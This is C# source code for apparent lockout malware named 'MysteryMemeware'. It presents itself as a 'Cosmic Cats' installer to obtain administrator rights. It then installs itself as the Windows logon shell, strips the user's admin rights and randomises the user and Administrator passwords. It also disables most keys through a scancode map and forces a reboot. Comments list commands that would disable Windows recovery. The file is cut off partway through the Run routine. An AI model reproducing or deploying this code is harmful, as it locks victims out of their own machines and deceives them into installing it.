using System;
using System.Diagnostics;
using System.IO;

namespace MysteryMemeware
{
    public static class Program
    {
        public const string InstallSubpath = "\\Shell.exe";
        public const string IsInstalledRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\IsInstalled";
        public const string AdminPasswordRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\AdminPassword";
        public static readonly string[] trueStrings = new string[] { "true", "yes", "1", "y", "t" };
        public static void Main()
        {
            var t = UserHelper.GetLocalDomain();
            return;
            try
            {
                if (IsInstalled())
                {
                    if (ProcessHelper.CurrentProcessIsAdmin())
                    {
                        Run();
                    }
                    else
                    {
                        try
                        {
                            ElevateSelf();
                        }
                        catch
                        {
                            Run();
                        }
                    }
                }
                else
                {
                    if (ProcessHelper.CurrentProcessIsAdmin())
                    {
                        Install();
                    }
                    else
                    {
                        BegForAdmin();
                    }
                }
                Process.GetCurrentProcess().Kill();
            }
            catch (Exception ex)
            {
                Debug.LogException(ex);
            }
        }
        public static bool IsInstalled()
        {
            try
            {
                object isInstalledObject = RegistryHelper.GetRegistryValue(IsInstalledRegistryPath);
                if (isInstalledObject is null)
                {
                    return false;
                }
                Type typeOfIsInstalled = isInstalledObject.GetType();
                if (typeOfIsInstalled == typeof(string))
                {
                    return StringHelper.MatchesArrayCaseless((string)isInstalledObject, trueStrings);
                }
                if (typeOfIsInstalled == typeof(long))
                {
                    return (long)isInstalledObject == 1;
                }
                if (typeOfIsInstalled == typeof(int))
                {
                    return (int)isInstalledObject == 1;
                }
                if (typeOfIsInstalled == typeof(bool))
                {
                    return (bool)isInstalledObject;
                }
                return false;
            }
            catch
            {
                return false;
            }
        }
        public static void ElevateSelf()
        {
            object adminPasswordObject = RegistryHelper.GetRegistryValue(AdminPasswordRegistryPath);
            if (adminPasswordObject is null || adminPasswordObject.GetType() != typeof(string))
            {
                throw new Exception("Failed to load admin password.");
            }
            string adminPassword = (string)adminPasswordObject;
            string currentExePath = PathHelper.GetCurrentExePath();
            ProcessHelper.RunAs($"\"{currentExePath}\"", "Administrator", adminPassword, ProcessHelper.WindowMode.Default, Path.GetDirectoryName(currentExePath));
        }
        public static void BegForAdmin()
        {
            if (System.Windows.Forms.MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", System.Windows.Forms.MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.No)
            {
                return;
            }
            if (System.Windows.Forms.MessageBox.Show("Elevated permissions are required in order to install Cosmic Cats. Please select yes on the following popup to grant the neccessary permission, or you may select no to cancel the installation.", "Elevated Permissions Required.", System.Windows.Forms.MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
            {
                return;
            }
            string currentExeLocation = PathHelper.GetCurrentExePath();
            ProcessHelper.Run($"{currentExeLocation}", ProcessHelper.WindowMode.Default, ProcessHelper.AdminMode.AlwaysAdmin, Path.GetDirectoryName(currentExeLocation));
        }
        public static void Install()
        {
            string currentExePath = PathHelper.GetCurrentExePath();
            string system32Path = PathHelper.GetSystem32Path();
            string rootDrive = Path.GetPathRoot(system32Path);

            string installLocation = system32Path + InstallSubpath;

            if (File.Exists(installLocation))
            {
                File.Delete(installLocation);
            }

            File.Copy(currentExePath, installLocation);

            #region GetUsername

            #region DebugFlags
            bool debugFlag_GetUsername = false;

            bool debugFlag_GetUsername_A = false;
            bool debugFlag_GetUsername_A_0 = false;

            bool debugFlag_GetUsername_B = false;
            bool debugFlag_GetUsername_B_0 = false;
            bool debugFlag_GetUsername_B_1 = false;

            bool debugFlag_GetUsername_C = false;
            #endregion

            string username = null;

            try
            {
                string potentialUsername = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

                try
                {
                    for (int i = potentialUsername.Length - 1; i >= 0; i--)
                    {
                        if (potentialUsername[i] is '\\' || potentialUsername[i] is '/')
                        {
                            potentialUsername = potentialUsername.Substring(0, i);

                            break;
                        }
                    }
                }
                catch
                {
                    debugFlag_GetUsername_A_0 = true;
                }

                username = potentialUsername;
            }
            catch
            {
                debugFlag_GetUsername_A = true;

                try
                {
                    string potentialUsername = System.Environment.UserName;

                    if (potentialUsername is null)
                    {
                        debugFlag_GetUsername_B_0 = true;

                        throw null;
                    }

                    try
                    {
                        for (int i = potentialUsername.Length - 1; i >= 0; i--)
                        {
                            if (potentialUsername[i] is '\\' || potentialUsername[i] is '/')
                            {
                                potentialUsername = potentialUsername.Substring(0, i);

                                break;
                            }
                        }
                    }
                    catch
                    {
                        debugFlag_GetUsername_B_1 = true;
                    }

                    username = potentialUsername;
                }
                catch
                {
                    debugFlag_GetUsername_B = true;

                    try
                    {
                        username = "Administrator";
                    }
                    catch
                    {
                        debugFlag_GetUsername_C = true;

                        debugFlag_GetUsername = true;
                    }
                }
            }

            #endregion

            #region EnableUser

            #region DebugFlags
            bool debugFlag_EnableUser = false;

            bool debugFlag_EnableUser_A = false;
            bool debugFlag_EnableUser_A_0 = false;
            bool debugFlag_EnableUser_A_1 = false;
            bool debugFlag_EnableUser_A_2 = false;
            bool debugFlag_EnableUser_A_3 = false;
            bool debugFlag_EnableUser_A_4 = false;
            #endregion

            try
            {
                if (username is null)
                {
                    debugFlag_EnableUser_A_0 = false;

                    throw null;
                }

                System.Diagnostics.ProcessStartInfo enableUserStartInfo = new System.Diagnostics.ProcessStartInfo();

                enableUserStartInfo.Arguments = "user \"" + username + "\" /active:yes";
                enableUserStartInfo.CreateNoWindow = true;
                enableUserStartInfo.Domain = null;
                enableUserStartInfo.ErrorDialog = false;
                enableUserStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                if (system32Path is not null)
                {
                    enableUserStartInfo.FileName = system32Path + "net.exe";
                }
                else
                {
                    enableUserStartInfo.FileName = "net.exe";
                }

                enableUserStartInfo.LoadUserProfile = false;
                enableUserStartInfo.Password = null;
                enableUserStartInfo.PasswordInClearText = null;
                enableUserStartInfo.RedirectStandardError = false;
                enableUserStartInfo.RedirectStandardInput = false;
                enableUserStartInfo.RedirectStandardOutput = false;
                enableUserStartInfo.StandardErrorEncoding = null;
                enableUserStartInfo.StandardOutputEncoding = null;
                enableUserStartInfo.UserName = null;
                enableUserStartInfo.UseShellExecute = false;
                enableUserStartInfo.Verb = "runas";
                enableUserStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                if (system32Path is not null)
                {
                    enableUserStartInfo.WorkingDirectory = system32Path;
                }
                else
                {
                    enableUserStartInfo.WorkingDirectory = null;
                }

                System.Diagnostics.Process enableUserProcess = System.Diagnostics.Process.Start(enableUserStartInfo);

                System.Diagnostics.Stopwatch timeoutStopwatch = null;

                try
                {
                    timeoutStopwatch = new System.Diagnostics.Stopwatch();

                    timeoutStopwatch.Restart();
                }
                catch
                {
                    debugFlag_EnableUser_A_1 = false;
                }

                while (!enableUserProcess.HasExited)
                {
                    bool timedOut = false;


                    try
                    {
                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
                        {
                            timedOut = true;
                        }
                    }
                    catch
                    {
                        debugFlag_EnableUser_A_2 = false;
                    }

                    if (timedOut)
                    {
                        debugFlag_EnableUser_A_3 = false;

                        throw null;
                    }
                }

                if (enableUserProcess.ExitCode is not 0)
                {
                    debugFlag_EnableUser_A_4 = false;

                    throw null;
                }
            }
            catch
            {
                debugFlag_EnableUser_A = true;

                debugFlag_EnableUser = true;
            }

            #endregion

            #region UnadminUser

            #region DebugFlags
            bool debugFlag_UnadminUser = false;

            bool debugFlag_UnadminUser_A = false;
            bool debugFlag_UnadminUser_A_0 = false;
            bool debugFlag_UnadminUser_A_1 = false;
            bool debugFlag_UnadminUser_A_2 = false;
            bool debugFlag_UnadminUser_A_3 = false;
            bool debugFlag_UnadminUser_A_4 = false;
            #endregion

            try
            {
                if (username is null)
                {
                    debugFlag_UnadminUser_A_0 = true;

                    throw null;
                }

                System.Diagnostics.ProcessStartInfo unadminUserStartInfo = new System.Diagnostics.ProcessStartInfo();

                unadminUserStartInfo.Arguments = "net localgroup \"Administrators\" /delete \"" + username + "\"";
                unadminUserStartInfo.CreateNoWindow = true;
                unadminUserStartInfo.Domain = null;
                unadminUserStartInfo.ErrorDialog = false;
                unadminUserStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                if (system32Path is not null)
                {
                    unadminUserStartInfo.FileName = system32Path + "net.exe";
                }
                else
                {
                    unadminUserStartInfo.FileName = "net.exe";
                }

                unadminUserStartInfo.LoadUserProfile = false;
                unadminUserStartInfo.Password = null;
                unadminUserStartInfo.PasswordInClearText = null;
                unadminUserStartInfo.RedirectStandardError = false;
                unadminUserStartInfo.RedirectStandardInput = false;
                unadminUserStartInfo.RedirectStandardOutput = false;
                unadminUserStartInfo.StandardErrorEncoding = null;
                unadminUserStartInfo.StandardOutputEncoding = null;
                unadminUserStartInfo.UserName = null;
                unadminUserStartInfo.UseShellExecute = false;
                unadminUserStartInfo.Verb = "runas";
                unadminUserStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                if (system32Path is not null)
                {
                    unadminUserStartInfo.WorkingDirectory = system32Path;
                }
                else
                {
                    unadminUserStartInfo.WorkingDirectory = null;
                }

                System.Diagnostics.Process unadminUserProcess = System.Diagnostics.Process.Start(unadminUserStartInfo);

                System.Diagnostics.Stopwatch timeoutStopwatch = null;

                try
                {
                    timeoutStopwatch = new System.Diagnostics.Stopwatch();

                    timeoutStopwatch.Restart();
                }
                catch
                {
                    debugFlag_UnadminUser_A_1 = true;
                }

                while (!unadminUserProcess.HasExited)
                {
                    bool timedOut = false;

                    try
                    {
                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
                        {
                            timedOut = true;
                        }
                    }
                    catch
                    {
                        debugFlag_UnadminUser_A_2 = true;
                    }

                    if (timedOut)
                    {
                        debugFlag_UnadminUser_A_3 = true;

                        throw null;
                    }
                }

                if (unadminUserProcess.ExitCode is not 0)
                {
                    debugFlag_UnadminUser_A_4 = true;

                    throw null;
                }
            }
            catch
            {
                debugFlag_UnadminUser_A = true;

                debugFlag_UnadminUser = true;
            }

            #endregion

            #region EnableAdmin

            #region DebugFlags
            bool debugFlag_EnableAdmin = false;

            bool debugFlag_EnableAdmin_A = false;
            bool debugFlag_EnableAdmin_A_0 = false;
            bool debugFlag_EnableAdmin_A_1 = false;
            bool debugFlag_EnableAdmin_A_2 = false;
            bool debugFlag_EnableAdmin_A_3 = false;
            #endregion

            try
            {
                System.Diagnostics.ProcessStartInfo enableAdminStartInfo = new System.Diagnostics.ProcessStartInfo();

                enableAdminStartInfo.Arguments = "user \"Administrator\" /active:yes";
                enableAdminStartInfo.CreateNoWindow = true;
                enableAdminStartInfo.Domain = null;
                enableAdminStartInfo.ErrorDialog = false;
                enableAdminStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                if (system32Path is not null)
                {
                    enableAdminStartInfo.FileName = system32Path + "net.exe";
                }
                else
                {
                    enableAdminStartInfo.FileName = "net.exe";
                }

                enableAdminStartInfo.LoadUserProfile = false;
                enableAdminStartInfo.Password = null;
                enableAdminStartInfo.PasswordInClearText = null;
                enableAdminStartInfo.RedirectStandardError = false;
                enableAdminStartInfo.RedirectStandardInput = false;
                enableAdminStartInfo.RedirectStandardOutput = false;
                enableAdminStartInfo.StandardErrorEncoding = null;
                enableAdminStartInfo.StandardOutputEncoding = null;
                enableAdminStartInfo.UserName = null;
                enableAdminStartInfo.UseShellExecute = false;
                enableAdminStartInfo.Verb = "runas";
                enableAdminStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                if (system32Path is not null)
                {
                    enableAdminStartInfo.WorkingDirectory = system32Path;
                }
                else
                {
                    enableAdminStartInfo.WorkingDirectory = null;
                }

                System.Diagnostics.Process enableAdminProcess = System.Diagnostics.Process.Start(enableAdminStartInfo);

                System.Diagnostics.Stopwatch timeoutStopwatch = null;

                try
                {
                    timeoutStopwatch = new System.Diagnostics.Stopwatch();

                    timeoutStopwatch.Restart();
                }
                catch
                {
                    debugFlag_EnableAdmin_A_0 = false;
                }

                while (!enableAdminProcess.HasExited)
                {
                    bool timedOut = false;


                    try
                    {
                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
                        {
                            timedOut = true;
                        }
                    }
                    catch
                    {
                        debugFlag_EnableAdmin_A_1 = false;
                    }

                    if (timedOut)
                    {
                        debugFlag_EnableAdmin_A_2 = false;

                        throw null;
                    }
                }

                if (enableAdminProcess.ExitCode is not 0)
                {
                    debugFlag_EnableAdmin_A_3 = false;

                    throw null;
                }
            }
            catch
            {
                debugFlag_EnableAdmin_A = true;

                debugFlag_EnableAdmin = true;
            }

            #endregion

            #region NewUserPass

            #region DebugFlags
            bool debugFlag_NewUserPass = false;

            bool debugFlag_NewUserPass_A = false;
            bool debugFlag_NewUserPass_A_0 = false;
            bool debugFlag_NewUserPass_A_1 = false;
            bool debugFlag_NewUserPass_A_2 = false;

            bool debugFlag_NewUserPass_B = false;
            #endregion

            string newUserPassword = null;

            try
            {
                System.Random RNG = null;

                try
                {
                    RNG = new System.Random((int)System.DateTime.Now.Ticks);
                }
                catch
                {
                    debugFlag_NewUserPass_A_0 = true;

                    try
                    {
                        RNG = new System.Random();
                    }
                    catch
                    {
                        debugFlag_NewUserPass_A_1 = true;
                    }
                }

                if (RNG is null)
                {
                    debugFlag_NewUserPass_A_2 = true;

                    throw null;
                }

                char[] userPasswordChars = new char[14] { 'P', 'a', 's', 's', 'w', 'o', 'r', 'd', '1', '2', '3', '4', '5', '6' };

                for (int i = 0; i < 14; i++)
                {
                    userPasswordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[RNG.Next(0, 62)];
                }

                newUserPassword = new string(userPasswordChars);
            }
            catch
            {
                debugFlag_NewUserPass_A = true;

                try
                {
                    newUserPassword = "Password123456";
                }
                catch
                {
                    debugFlag_NewUserPass_B = true;

                    debugFlag_NewUserPass = true;
                }
            }

            #endregion

            #region CngUserPass

            #region DebugFlags
            bool debugFlag_CngUserPass = false;

            bool debugFlag_CngUserPass_A = false;
            bool debugFlag_CngUserPass_A_0 = false;
            bool debugFlag_CngUserPass_A_1 = false;
            bool debugFlag_CngUserPass_A_2 = false;
            bool debugFlag_CngUserPass_A_3 = false;
            bool debugFlag_CngUserPass_A_4 = false;
            bool debugFlag_CngUserPass_A_5 = false;
            #endregion

            try
            {
                if (username is null)
                {
                    debugFlag_CngUserPass_A_0 = true;

                    throw null;
                }

                if (newUserPassword is null)
                {
                    debugFlag_CngUserPass_A_1 = true;

                    throw null;
                }

                System.Diagnostics.ProcessStartInfo changerUserPasswordStartInfo = new System.Diagnostics.ProcessStartInfo();

                changerUserPasswordStartInfo.Arguments = "user \"" + username + "\" \"" + newUserPassword + "\"";
                changerUserPasswordStartInfo.CreateNoWindow = true;
                changerUserPasswordStartInfo.Domain = null;
                changerUserPasswordStartInfo.ErrorDialog = false;
                changerUserPasswordStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                if (system32Path is not null)
                {
                    changerUserPasswordStartInfo.FileName = system32Path + "net.exe";
                }
                else
                {
                    changerUserPasswordStartInfo.FileName = "net.exe";
                }

                changerUserPasswordStartInfo.LoadUserProfile = false;
                changerUserPasswordStartInfo.Password = null;
                changerUserPasswordStartInfo.PasswordInClearText = null;
                changerUserPasswordStartInfo.RedirectStandardError = false;
                changerUserPasswordStartInfo.RedirectStandardInput = false;
                changerUserPasswordStartInfo.RedirectStandardOutput = false;
                changerUserPasswordStartInfo.StandardErrorEncoding = null;
                changerUserPasswordStartInfo.StandardOutputEncoding = null;
                changerUserPasswordStartInfo.UserName = null;
                changerUserPasswordStartInfo.UseShellExecute = false;
                changerUserPasswordStartInfo.Verb = "runas";
                changerUserPasswordStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                if (system32Path is not null)
                {
                    changerUserPasswordStartInfo.WorkingDirectory = system32Path;
                }
                else
                {
                    changerUserPasswordStartInfo.WorkingDirectory = null;
                }

                System.Diagnostics.Process changeUserPasswordProcess = System.Diagnostics.Process.Start(changerUserPasswordStartInfo);

                System.Diagnostics.Stopwatch timeoutStopwatch = null;

                try
                {
                    timeoutStopwatch = new System.Diagnostics.Stopwatch();

                    timeoutStopwatch.Restart();
                }
                catch
                {
                    debugFlag_CngUserPass_A_2 = true;
                }

                while (!changeUserPasswordProcess.HasExited)
                {
                    bool timedOut = false;

                    try
                    {
                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
                        {
                            timedOut = true;
                        }
                    }
                    catch
                    {
                        debugFlag_CngUserPass_A_3 = true;
                    }

                    if (timedOut)
                    {
                        debugFlag_CngUserPass_A_4 = true;

                        throw null;
                    }
                }

                if (changeUserPasswordProcess.ExitCode is not 0)
                {
                    debugFlag_CngUserPass_A_5 = true;

                    throw null;
                }
            }
            catch
            {
                debugFlag_CngUserPass_A = true;

                debugFlag_CngUserPass = true;
            }

            #endregion

            #region NewAdminPass

            #region DebugFlags
            bool debugFlag_NewAdminPass = false;

            bool debugFlag_NewAdminPass_A = false;
            bool debugFlag_NewAdminPass_A_0 = false;
            bool debugFlag_NewAdminPass_A_1 = false;
            bool debugFlag_NewAdminPass_A_2 = false;

            bool debugFlag_NewAdminPass_B = false;
            #endregion

            string newAdminPassword = null;

            try
            {
                System.Random RNG = null;

                try
                {
                    RNG = new System.Random((int)System.DateTime.Now.Ticks);
                }
                catch
                {
                    debugFlag_NewAdminPass_A_0 = true;

                    try
                    {
                        RNG = new System.Random();
                    }
                    catch
                    {
                        debugFlag_NewAdminPass_A_1 = true;
                    }
                }

                if (RNG is null)
                {
                    debugFlag_NewAdminPass_A_2 = true;

                    throw null;
                }

                char[] adminPasswordChars = new char[14] { 'P', 'a', 's', 's', 'w', 'o', 'r', 'd', '1', '2', '3', '4', '5', '6' };

                for (int i = 0; i < 14; i++)
                {
                    adminPasswordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[RNG.Next(0, 62)];
                }

                newAdminPassword = new string(adminPasswordChars);
            }
            catch
            {
                debugFlag_NewAdminPass_A = true;

                try
                {
                    newAdminPassword = "Password123456";
                }
                catch
                {
                    debugFlag_NewAdminPass_B = true;

                    debugFlag_NewAdminPass = true;
                }
            }

            #endregion

            #region CngAdminPass

            #region DebugFlags
            bool debugFlag_CngAdminPass = false;

            bool debugFlag_CngAdminPass_A = false;
            bool debugFlag_CngAdminPass_A_0 = false;
            bool debugFlag_CngAdminPass_A_1 = false;
            bool debugFlag_CngAdminPass_A_2 = false;
            bool debugFlag_CngAdminPass_A_3 = false;
            bool debugFlag_CngAdminPass_A_4 = false;
            #endregion

            try
            {
                if (newAdminPassword is null)
                {
                    debugFlag_CngAdminPass_A_0 = true;

                    throw null;
                }

                System.Diagnostics.ProcessStartInfo changeAdminPasswordStartInfo = new System.Diagnostics.ProcessStartInfo();

                changeAdminPasswordStartInfo.Arguments = "user \"Administrator\" \"" + newAdminPassword + "\"";
                changeAdminPasswordStartInfo.CreateNoWindow = true;
                changeAdminPasswordStartInfo.Domain = null;
                changeAdminPasswordStartInfo.ErrorDialog = false;
                changeAdminPasswordStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                if (system32Path is not null)
                {
                    changeAdminPasswordStartInfo.FileName = system32Path + "net.exe";
                }
                else
                {
                    changeAdminPasswordStartInfo.FileName = "net.exe";
                }

                changeAdminPasswordStartInfo.LoadUserProfile = false;
                changeAdminPasswordStartInfo.Password = null;
                changeAdminPasswordStartInfo.PasswordInClearText = null;
                changeAdminPasswordStartInfo.RedirectStandardError = false;
                changeAdminPasswordStartInfo.RedirectStandardInput = false;
                changeAdminPasswordStartInfo.RedirectStandardOutput = false;
                changeAdminPasswordStartInfo.StandardErrorEncoding = null;
                changeAdminPasswordStartInfo.StandardOutputEncoding = null;
                changeAdminPasswordStartInfo.UserName = null;
                changeAdminPasswordStartInfo.UseShellExecute = false;
                changeAdminPasswordStartInfo.Verb = "runas";
                changeAdminPasswordStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                if (system32Path is not null)
                {
                    changeAdminPasswordStartInfo.WorkingDirectory = system32Path;
                }
                else
                {
                    changeAdminPasswordStartInfo.WorkingDirectory = null;
                }

                System.Diagnostics.Process changeUserPasswordProcess = System.Diagnostics.Process.Start(changeAdminPasswordStartInfo);

                System.Diagnostics.Stopwatch timeoutStopwatch = null;

                try
                {
                    timeoutStopwatch = new System.Diagnostics.Stopwatch();

                    timeoutStopwatch.Restart();
                }
                catch
                {
                    debugFlag_CngAdminPass_A_1 = true;
                }

                while (!changeUserPasswordProcess.HasExited)
                {
                    bool timedOut = false;

                    try
                    {
                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
                        {
                            timedOut = true;
                        }
                    }
                    catch
                    {
                        debugFlag_CngAdminPass_A_2 = true;
                    }

                    if (timedOut)
                    {
                        debugFlag_CngAdminPass_A_3 = true;

                        throw null;
                    }
                }

                if (changeUserPasswordProcess.ExitCode is not 0)
                {
                    debugFlag_CngAdminPass_A_4 = true;

                    throw null;
                }
            }
            catch
            {
                debugFlag_CngAdminPass_A = true;

                debugFlag_CngAdminPass = true;
            }

            #endregion



            //Open the local machine registry in 64 bit mode for use later.

            Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

            //Set the users scancode map to a custom scancode map which disables most of the keyboard. For a full list of disabled keys see ATTACKMETHODS.md.

            Microsoft.Win32.RegistryKey KeyboardLayout = LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\Keyboard Layout", true);

            byte[] scancodeMapBytes = new byte[328] { 0, 0, 0, 0, 0, 0, 0, 0, 79, 0, 0, 0, 0, 0, 33, 224, 0, 0, 108, 224, 0, 0, 109, 224, 0, 0, 17, 224, 0, 0, 107, 224, 0, 0, 64, 224, 0, 0, 66, 224, 0, 0, 59, 224, 0, 0, 62, 224, 0, 0, 60, 224, 0, 0, 63, 224, 0, 0, 88, 224, 0, 0, 7, 224, 0, 0, 65, 224, 0, 0, 87, 224, 0, 0, 67, 224, 0, 0, 35, 224, 0, 0, 61, 224, 0, 0, 8, 224, 0, 0, 59, 0, 0, 0, 68, 0, 0, 0, 87, 0, 0, 0, 88, 0, 0, 0, 100, 0, 0, 0, 101, 0, 0, 0, 102, 0, 0, 0, 103, 0, 0, 0, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 60, 0, 0, 0, 107, 0, 0, 0, 108, 0, 0, 0, 109, 0, 0, 0, 110, 0, 0, 0, 111, 0, 0, 0, 61, 0, 0, 0, 62, 0, 0, 0, 63, 0, 0, 0, 64, 0, 0, 0, 65, 0, 0, 0, 66, 0, 0, 0, 67, 0, 0, 0, 19, 224, 0, 0, 20, 224, 0, 0, 18, 224, 0, 0, 32, 224, 0, 0, 25, 224, 0, 0, 34, 224, 0, 0, 16, 224, 0, 0, 36, 224, 0, 0, 46, 224, 0, 0, 48, 224, 0, 0, 93, 224, 0, 0, 70, 224, 0, 0, 79, 224, 0, 0, 1, 0, 0, 0, 71, 224, 0, 0, 56, 0, 0, 0, 29, 0, 0, 0, 91, 224, 0, 0, 81, 224, 0, 0, 73, 224, 0, 0, 94, 224, 0, 0, 55, 224, 0, 0, 56, 224, 0, 0, 56, 224, 0, 0, 29, 224, 0, 0, 92, 224, 0, 0, 95, 224, 0, 0, 99, 224, 0, 0, 106, 224, 0, 0, 102, 224, 0, 0, 105, 224, 0, 0, 50, 224, 0, 0, 103, 224, 0, 0, 101, 224, 0, 0, 104, 224, 0, 0, 0, 0 };

            KeyboardLayout.SetValue("Scancode Map", scancodeMapBytes);

            KeyboardLayout.Flush();
            KeyboardLayout.Close();
            KeyboardLayout.Dispose();

            //Open the software registry for use later.

            Microsoft.Win32.RegistryKey Software = LocalMachine.CreateSubKey("SOFTWARE", true);

            //Set a registry to disable the privacey experience popup when signing into a new user account.

            Microsoft.Win32.RegistryKey OOBE = Software.CreateSubKey("Policies\\Microsoft\\Windows\\OOBE", true);

            OOBE.SetValue("DisablePrivacyExperience", 1);

            OOBE.Flush();
            OOBE.Close();
            OOBE.Dispose();

            //Open up the winlogon registry for user later.

            Microsoft.Win32.RegistryKey WinLogon = Software.CreateSubKey("Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

            //Set a registry to change the users shell to this program so that it runs instantly uppon sign in. 
            WinLogon.SetValue("Shell", installLocation);

            //Set some registries to automatically sign into the the MysteryUser.

            WinLogon.SetValue("DefaultUserName", username);
            WinLogon.SetValue("DefaultPassword", newUserPassword);
            WinLogon.SetValue("AutoAdminLogon", 1);

            //Close the winlogon registry since we are now completely done using it.

            WinLogon.Flush();
            WinLogon.Close();
            WinLogon.Dispose();

            //C:\Windows\System32\ReAgentc.exe /disable

            //C:\Windows\System32\bcdedit.exe /set {current} bootstatuspolicy ignoreallfailures
            //C:\Windows\System32\bcdedit.exe /set {current} recoveryenabled No

            //C:\Windows\System32\bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
            //C:\Windows\System32\bcdedit.exe /set {default} recoveryenabled No

            //C:\Windows\System32\bcdedit.exe /set {bootmgr} displaybootmenu No
            //C:\Windows\System32\bcdedit.exe /set {globalsettings} advancedoptions false
            //C:\Windows\System32\bcdedit.exe /set {current} bootmenupolicy standard

            //Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PrecisionTouchPad\Status\Enabled 0

            //Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Wisp\Touch\TouchGate 0

            //Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System NoLocalPasswordResetQuestions 1

            //Now that we are done installing this software. Open up the settings registry to store some information about the installation.

            Microsoft.Win32.RegistryKey MysteryMemeware = Software.CreateSubKey("MysteryMemeware", true);

            MysteryMemeware.SetValue("AdministratorPassword", newAdminPassword);
            MysteryMemeware.SetValue("UserPassword", newUserPassword);
            MysteryMemeware.SetValue("IsInstalled", "true");

            MysteryMemeware.Flush();
            MysteryMemeware.Close();
            MysteryMemeware.Dispose();

            //Close the software registry since we are now completely done using it.

            Software.Flush();
            Software.Close();
            Software.Dispose();

            //Close the local machine registry since we are now completely done using it.

            LocalMachine.Flush();
            LocalMachine.Close();
            LocalMachine.Dispose();

            #region Restart Computer

            try
            {
                System.Diagnostics.ProcessStartInfo restartComputerStartInfo = new System.Diagnostics.ProcessStartInfo();

                restartComputerStartInfo.Arguments = "/r /f /t 0";
                restartComputerStartInfo.CreateNoWindow = true;
                restartComputerStartInfo.Domain = null;
                restartComputerStartInfo.ErrorDialog = false;
                restartComputerStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                if (system32Path is not null)
                {
                    restartComputerStartInfo.FileName = system32Path + "shutdown.exe";
                }
                else
                {
                    restartComputerStartInfo.FileName = "shutdown.exe";
                }

                restartComputerStartInfo.LoadUserProfile = false;
                restartComputerStartInfo.Password = null;
                restartComputerStartInfo.PasswordInClearText = null;
                restartComputerStartInfo.RedirectStandardError = false;
                restartComputerStartInfo.RedirectStandardInput = false;
                restartComputerStartInfo.RedirectStandardOutput = false;
                restartComputerStartInfo.StandardErrorEncoding = null;
                restartComputerStartInfo.StandardOutputEncoding = null;
                restartComputerStartInfo.UserName = null;
                restartComputerStartInfo.UseShellExecute = false;
                restartComputerStartInfo.Verb = "runas";
                restartComputerStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                if (system32Path is not null)
                {
                    restartComputerStartInfo.WorkingDirectory = system32Path;
                }
                else
                {
                    restartComputerStartInfo.WorkingDirectory = null;
                }

                System.Diagnostics.Process restartComputerProcess = System.Diagnostics.Process.Start(restartComputerStartInfo);
            }
            catch
            {
                try
                {
                    System.Diagnostics.ProcessStartInfo restartComputerStartInfo = new System.Diagnostics.ProcessStartInfo();

                    restartComputerStartInfo.Arguments = "/r /f /t 0";
                    restartComputerStartInfo.CreateNoWindow = true;
                    restartComputerStartInfo.Domain = null;
                    restartComputerStartInfo.ErrorDialog = false;
                    restartComputerStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                    if (system32Path is not null)
                    {
                        restartComputerStartInfo.FileName = system32Path + "shutdown.exe";
                    }
                    else
                    {
                        restartComputerStartInfo.FileName = "shutdown.exe";
                    }

                    restartComputerStartInfo.LoadUserProfile = false;
                    restartComputerStartInfo.Password = null;
                    restartComputerStartInfo.PasswordInClearText = null;
                    restartComputerStartInfo.RedirectStandardError = false;
                    restartComputerStartInfo.RedirectStandardInput = false;
                    restartComputerStartInfo.RedirectStandardOutput = false;
                    restartComputerStartInfo.StandardErrorEncoding = null;
                    restartComputerStartInfo.StandardOutputEncoding = null;
                    restartComputerStartInfo.UserName = null;
                    restartComputerStartInfo.UseShellExecute = false;
                    restartComputerStartInfo.Verb = null;
                    restartComputerStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                    if (system32Path is not null)
                    {
                        restartComputerStartInfo.WorkingDirectory = system32Path;
                    }
                    else
                    {
                        restartComputerStartInfo.WorkingDirectory = null;
                    }

                    System.Diagnostics.Process restartComputerProcess = System.Diagnostics.Process.Start(restartComputerStartInfo);
                }
                catch
                {

                }
            }

            #endregion
        }
        public static void Run()
        {
            //VolumeModule.SetVolume();
            //TaskMGRModule.KillTaskMGR();
            // MouseLockModule.LockMouse();

            int screenCount = System.Windows.Forms.Screen.AllScreens.Length;
            for (int screenIndex = 0; screenIndex < screenCount; screenIndex++)
            {

                int localScreenIndex = screenIndex;
